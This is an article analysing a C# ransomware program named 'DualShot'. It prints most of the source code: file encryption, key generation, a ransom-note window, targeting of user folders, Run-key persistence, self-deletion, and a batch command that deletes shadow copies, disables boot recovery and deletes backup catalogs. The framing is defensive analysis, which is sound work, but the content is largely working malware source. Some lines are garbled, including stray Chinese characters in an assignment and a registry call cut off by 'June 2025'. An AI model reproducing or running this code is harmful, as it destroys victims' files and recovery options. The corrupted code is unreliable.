# 🔒 Analyzing a Ransomware Implementation in C# 🔒

This article dissects a malicious C# program, `DualShot`, which exhibits ransomware behavior. The code encrypts user files, demands a decryption key, and employs various persistence and anti-recovery techniques. Below, we analyze the key components of the program, illustrating each point with the relevant source code. The goal is to understand its functionality and highlight its malicious intent.

---

## 🛠️ Overview of the Program

The `DualShot` program is a ransomware that targets specific file types in user directories (e.g., Desktop, Documents) and encrypts them using a custom encryption scheme. It generates a public-private key pair, encrypts files with the public key, and stores the private key for potential decryption. The program also deletes shadow copies, sets up persistence via registry entries, and displays a ransom note in a GUI window.

Key components:
- **Program.cs**: Main entry point, file encryption/decryption logic, and system manipulation.
- **DSEncryption.cs**: Custom encryption and key generation logic.
- **MainWindow.cs**: GUI for the ransom note.

Below, we break down each critical aspect of the code.

---

## 🔐 File Encryption and Decryption Logic

### 📜 EncryptFile Method
The `EncryptFile` method in `Program.cs` encrypts a file using a provided public key and saves it with a `.dsec` extension. It preserves the original file's timestamps to avoid detection and attempts to delete the original file after encryption.

```csharp
private static void EncryptFile(string fpath, byte[] pbkey)
{
    DateTime creationTime = File.GetCreationTime(fpath);
    DateTime lastAccessTime = File.GetLastAccessTime(fpath);
    DateTime lastWriteTime = File.GetLastWriteTime(fpath);
    byte[] array = DSEncryption.Encrypt(File.ReadAllBytes(fpath), pbkey);
    FileStream fileStream = File.Create(fpath + ".dsec");
    fileStream.Write(array, 0, array.Length);
    fileStream.Close();
    File.SetCreationTime(fpath + ".dsec", creationTime);
    File.SetLastAccessTime(fpath + ".dsec", lastAccessTime);
    File.SetLastWriteTime(fpath + ".dsec", lastWriteTime);
    try
    {
        File.Open(fpath, FileMode.Truncate, FileAccess.ReadWrite).Close();
    }
    catch (Exception)
    {
    }
    try
    {
        File.Delete(fpath);
    }
    catch (Exception)
    {
    }
}
```

**Key Points**:
- Reads the file's content and encrypts it using `DSEncryption.Encrypt`.
- Creates a new file with the `.dsec` extension for the encrypted content.
- Maintains original timestamps to evade detection.
- Attempts to truncate and delete the original file, with exception handling to avoid crashes.

### 📜 DecryptFile Method
The `DecryptFile` method reverses the encryption process, using the private key to restore the original file.

```csharp
private static void DecryptFile(string fpath, byte[] pvkey)
{
    DateTime creationTime = File.GetCreationTime(fpath);
    DateTime lastAccessTime = File.GetLastAccessTime(fpath);
    DateTime lastWriteTime = File.GetLastWriteTime(fpath);
    byte[] array = DSEncryption.Decrypt(File.ReadAllBytes(fpath), pvkey);
    FileStream fileStream = File.Create(fpath.Substring(0, fpath.Length - 5));
    fileStream.Write(array, 0, array.Length);
    fileStream.Close();
    File.SetCreationTime(fpath.Substring(0, fpath.Length - 5), creationTime);
    File.SetLastAccessTime(fpath.Substring(0, fpath.Length - 5), lastAccessTime);
    File.SetLastWriteTime(fpath.Substring(0, fpath.Length - 5), lastWriteTime);
    try
    {
        File.Delete(fpath);
    }
    catch (Exception)
    {
    }
}
```

**Key Points**:
- Decrypts the `.dsec` file using `DSEncryption.Decrypt`.
- Creates a new file without the `.dsec` extension.
- Restores original timestamps and deletes the encrypted file.

---

## 🔑 Encryption Mechanism (DSEncryption Class)

The `DSEncryption` class handles key generation, encryption, and decryption. It uses a simplistic, non-standard encryption scheme.

### 📜 Key Generation
The `GenerateKeys` method creates a public-private key pair with a custom transformation.

```csharp
public static Tuple<byte[], byte[]> GenerateKeys(int length, int vlength)
{
    byte[] array = new byte[0];
    for (int i = 0; i < length; i++)
    {
        Array.Resize(ref array, array.Length + 1);
        array[array.GetUpperBound(0)] = (byte)r.Next(1, vlength);
    }
    byte[] array2 = new byte[0];
    bool flag = false;
    byte[] array3 = array;
    foreach (byte b in array3)
    {
        Array.Resize(ref array2, array2.Length + 1);
        if (flag)
        {
            flag = false;
            array2[array2.GetUpperBound(0)] =也很 b;
        }
        else
        {
            flag = true;
            array2[array2.GetUpperBound(0)] = (byte)(b + 1);
        }
    }
    return Tuple.Create(array, array2);
}
```

**Key Points**:
- Generates a public key (`array`) with random bytes between 1 and `vlength`.
- Creates a private key (`array2`) by alternating between copying the public key bytes and incrementing them by 1.
- Returns a `Tuple` containing both keys.

### 📜 Encryption
The `Encrypt` method adds public key bytes to the input data in a cyclic manner.

```csharp
public static byte[] Encrypt(byte[] array, byte[] pbkey)
{
    byte[] array2 = (byte[])array.Clone();
    int num = 0;
    for (int i = 0; i < array2.Length; i++)
    {
        try
        {
            array2[i] += pbkey[num];
        }
        catch
        {
        }
        num++;
        if (num > pbkey.Length)
        {
            num = 0;
        }
    }
    return array2;
}
```

**Key Points**:
- Clones the input data to avoid modifying the original.
- Adds public key bytes to each input byte, cycling through the key.
- Uses exception handling to skip errors (e.g., overflow).

### 📜 Decryption
The `Decrypt` method reverses the encryption by subtracting transformed private key bytes.

```csharp
public static byte[] Decrypt(byte[] array, byte[] pvkey)
{
    byte[] array2 = (byte[])array.Clone();
    pvkey.Reverse();
    bool flag = false;
    byte[] array3 = new byte[0];
    foreach (byte b in pvkey)
    {
        Array.Resize(ref array3, array3.Length + 1);
        if (flag)
        {
            flag = false;
            array3[array3.GetUpperBound(0)] = b;
        }
        else
        {
            flag = true;
            array3[array3.GetUpperBound(0)] = (byte)(b - 1);
        }
    }
    int num = 0;
    for (int j = 0; j < array2.Length; j++)
    {
        try
        {
            array2[j] -= array3[num];
        }
        catch
        {
        }
        num++;
        if (num > array3.Length)
        {
            num = 0;
        }
    }
    return array2;
}
```

**Key Points**:
- Reverses the private key and applies a transformation (alternating between copying and decrementing by 1).
- Subtracts the transformed key bytes from the encrypted data.
- Cycles through the key and handles exceptions.

---

## 🖥️ Ransom Note GUI (MainWindow Class)

The `MainWindow` class creates a GUI to display the ransom note, listing affected files and prompting the user to enter a decryption key.

```csharp
public class MainWindow : Form
{
    private IContainer components;
    private Label title;
    private Label description;
    private Label label1;
    private TextBox aflist;
    private Label label2;
    private Label label3;
    private TextBox textBox1;
    private Button button1;

    public MainWindow(string[] fileslist, byte[] pvk)
    {
        InitializeComponent();
        ((Control)aflist).Text = string.Join("\r\n", fileslist);
    }

    private void MainWindow_Load(object sender, EventArgs e)
    {
        ((Control)title).Left = (((Form)this).ClientSize.Width - ((Control)title).Width) / 2;
        ((Control)description).Left = (((Form)this).ClientSize.Width - ((Control)description).Width) / 2;
    }

    private void InitializeComponent()
    {
        ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainWindow));
        title = new Label();
        description = new Label();
        label1 = new Label();
        aflist = new TextBox();
        label2 = new Label();
        label3 = new Label();
        textBox1 = new TextBox();
        button1 = new Button();
        ((Control)this).SuspendLayout();
        ((Control)title).AutoSize = true;
        ((Control)title).Font = new Font("Microsoft YaHei", 16f, (FontStyle)1);
        ((Control)title).ForeColor = Color.White;
        ((Control)title).Location = new Point(53, 9);
        ((Control)title).Name = "title";
        ((Control)title).Size = new Size(659, 36);
        ((Control)title).TabIndex = 0;
        ((Control)title).Text = "Oops, your personal files have been encrypted!";
        title.TextAlign = (ContentAlignment)32;
        // ... (other UI setup code)
        ((Control)this).ResumeLayout(false);
        ((Control)this).PerformLayout();
    }
}
```

**Key Points**:
- Displays a message: "Oops, your personal files have been encrypted!"
- Lists affected files in a read-only textbox (`aflist`).
- Includes a textbox and button for entering/checking a decryption key.
- Uses a `Form` with no minimize/maximize buttons, set to `TopMost` for visibility.

---

## 🕵️ Malicious Behaviors

The `Main` method orchestrates the ransomware's behavior, including file targeting, encryption, and persistence.

```csharp
[STAThread]
private static void Main(string[] args)
{
    Dictionary<string, string> dictionary = new Dictionary<string, string>();
    dictionary.Add("RebootAfterEnc", "0");
    dictionary.Add("DeleteShadowCopies", "1");
    if (File.Exists("C:\\Users\\Lenovo\\Desktop\\AntiOwnVirus.txt") || Directory.Exists("C:\\Users\\Lenovo\\Desktop\\WiringIcons"))
    {
        Process.GetCurrentProcess().Kill();
    }
    Random random = new Random();
    Application.EnableVisualStyles();
    Application.SetCompatibleTextRenderingDefault(false);
    string value;
    if (args.Length != 0)
    {
        if (args[0] == "/inin")
        {
            bool flag = false;
            if (args.Length > 1 && args[1] == "/no,res")
            {
                flag = true;
            }
            Thread.Sleep(5000);
            Tuple<byte[], byte[]> tuple = DSEncryption.GenerateKeys(15, 5);
            byte[] item = tuple.Item1;
            byte[] item2 = tuple.Item2;
            string text = Path.GetTempPath() + "TMP10" + random.Next(10000, 99999) + ".dat";
            FileStream fileStream = File.Create(text);
            fileStream.Write(item2, 0, item2.Length);
            fileStream.Close();
            string[] array = new string[0];
            string[] array2 = new string[6] { "Desktop", "Documents", "Music", "Video", "Photos", "Downloads" };
            string[] array3 = new string[53]
            {
                "png", "jpg", "jpeg", "bmp", "tif", "tiff", "txt", "ogg", "wav", "mp3",
                "mp4", "pdn", "zip", "7z", "7zip", "tar.gz", "doc", "dot", "wbk", "docx",
                // ... (other extensions)
            };
            string text2 = Directory.GetParent(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)).FullName;
            if (Environment.OSVersion.Version.Major >= 6)
            {
                text2 = Directory.GetParent(text2).ToString();
            }
            string[] array4 = array2;
            foreach (string text3 in array4)
            {
                try
                {
                    string[] files = Directory.GetFiles(text2 + "\\" + text3, "*.*", SearchOption.AllDirectories);
                    foreach (string text4 in files)
                    {
                        try
                        {
                            string[] array5 = array3;
                            foreach (string text5 in array5)
                            {
                                if (text4.EndsWith("." + text5))
                                {
                                    Array.Resize(ref array, array.Length + 1);
                                    array[array.GetUpperBound(0)] = text4;
                                    break;
                                }
                            }
                        }
                        catch (Exception)
                        {
                        }
                    }
                }
                catch (Exception)
                {
                }
            }
            array4 = array;
            foreach (string fpath in array4)
            {
                try
                {
                    EncryptFile(fpath, item);
                }
                catch (Exception)
                {
                }
            }
            string s = string.Join("\n", array);
            string text6 = Path.GetTempPath() + "TMP" + random.Next(10000, 99999) + ".dat";
            FileStream fileStream2 = File.Create(text6);
            fileStream2.Write(Encoding.ASCII.GetBytes(s), 0, Encoding.ASCII.GetBytes(s).Length);
            fileStream2.Close();
            dictionary.TryGetValue("DeleteShadowCopies", out value);
            if (value == "1")
            {
                string text7 = Path.GetTempPath() + "tmp" + random.Next(100, 999) + "0042.bat";
                FileStream fileStream3 = File.Create(text7);
                File.WriteAllText(text7, "vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet");
                fileStream3.Close();
                Process.Start(new ProcessStartInfo
                {
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    FileName = "cmd",
                    Arguments = "/c " + text7,
                    Verb = "runas"
                });
            }
            Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", "WINUPD" + random.Next(10000, 99999June 2025
            if (flag)
            {
                Process.Start(new ProcessStartInfo
                {
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    FileName = "shutdown",
                    Arguments = "-r -t 60 -c \"Please restart.\""
                });
            }
            else
            {
                Process.Start(Assembly.GetExecutingAssembly().Location, "/ainain " + text6 + " " + text);
            }
            Process.GetCurrentProcess().Kill();
        }
        else if (args[0] == "/ainain")
        {
            string[] fileslist = File.ReadAllLines(args[1]);
            if (File.Exists(args[2]))
            {
                byte[] inArray = File.ReadAllBytes(args[2]);
                Settings.Default.privkeyenc = Convert.ToBase64String(inArray);
                try
                {
                    File.Open(args[2], FileMode.Truncate, FileAccess.ReadWrite).Close();
                }
                catch (Exception)
                {
                }
                File.Delete(args[2]);
            }
            Application.Run((Form)(object)new MainWindow(fileslist, Convert.FromBase64String(Settings.Default.privkeyenc)));
        }
        return;
    }
    string text8 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DSNWIN" + random.Next(1000, 9999) + ".exe";
    File.Copy(Assembly.GetExecutingAssembly().Location, text8);
    dictionary.TryGetValue("RebootAfterEnc", out value);
    if (value == "0")
    {
        Process.Start(text8, "/inin /nores");
    }
    else
    {
        Process.Start(text8, "/inin");
    }
    string[] array6 = new string[2] { "vbs", "bat" };
    for (int l = 0; l < 25; l++)
    {
        try
        {
            string text9 = Path.GetTempPath() + "tds" + random.Next(100000, 999999) + "." + array6[random.Next(array6.Length)];
            File.Create(text9).Close();
            Process.Start(new ProcessStartInfo
            {
                FileName = text9,
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            });
        }
        catch (Exception)
        {
        }
    }
    Process.Start(new ProcessStartInfo
    {
        RedirectStandardOutput = true,
        UseShellExecute = false,
        CreateNoWindow = true,
        FileName = "cmd",
        Arguments = "/c choice /c Y /n /d Y /t 3 & del \"" + Assembly.GetExecutingAssembly().Location + "\""
    });
    Process.GetCurrentProcess().Kill();
}
```

**Key Points**:
- **Anti-Detection**: Checks for specific files/directories (`AntiOwnVirus.txt`, `WiringIcons`) to terminate if detected, likely to avoid analysis environments.
- **File Targeting**: Targets common user directories and 53 file extensions (e.g., `.png`, `.docx`, `.mp3`).
- **Shadow Copy Deletion**: Executes a batch script to delete shadow copies and disable recovery options, preventing file restoration.
- **Persistence**: Adds a registry entry to run the program on startup with the `/ainain` argument, passing the list of encrypted files and private key.
- **Self-Deletion**: Copies itself to a new location, creates decoy `.vbs`/`.bat` files, and deletes the original executable.
- **Command-Line Modes**:
  - `/inin`: Initiates encryption and setup.
  - `/ainain`: Launches the ransom note GUI.
  - `/nores`: Optional flag to skip reboot after encryption.

---

## 🛡️ Anti-Recovery Techniques

The program employs several techniques to prevent file recovery:

```csharp
if (value == "1")
{
    string text7 = Path.GetTempPath() + "tmp" + random.Next(100, 999) + "0042.bat";
    FileStream fileStream3 = File.Create(text7);
    File.WriteAllText(text7, "vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet");
    fileStream3.Close();
    Process.Start(new ProcessStartInfo
    {
        RedirectStandardOutput = true,
        UseShellExecute = false,
        CreateNoWindow = true,
        FileName = "cmd",
        Arguments = "/c " + text7,
        Verb = "runas"
    });
}
```

**Key Points**:
- Deletes shadow copies using `vssadmin` and `wmic`.
- Disables boot status policy and recovery options via `bcdedit`.
- Deletes backup catalogs with `wbadmin`.

---

## 📊 Security Implications

This ransomware is simplistic but dangerous:
- **Weak Encryption**: The encryption scheme is not cryptographically secure (e.g., no standard algorithms like AES or RSA), making it potentially reversible by analysts.
- **Broad Targeting**: Targets a wide range of file types, maximizing impact.
- **Anti-Recovery**: Deleting shadow copies and disabling recovery options makes restoration difficult without the private key.
- **Persistence**: Registry-based persistence ensures the ransom note reappears on reboot.
- **Self-Deletion**: Attempts to evade detection by deleting its original executable.

---

## 📝 Conclusion

The `DualShot` ransomware demonstrates a malicious combination of file encryption, anti-recovery techniques, and persistence mechanisms. While its encryption is not sophisticated, its ability to target user files and disable recovery options poses a significant threat. Understanding such code is crucial for developing effective defenses against ransomware.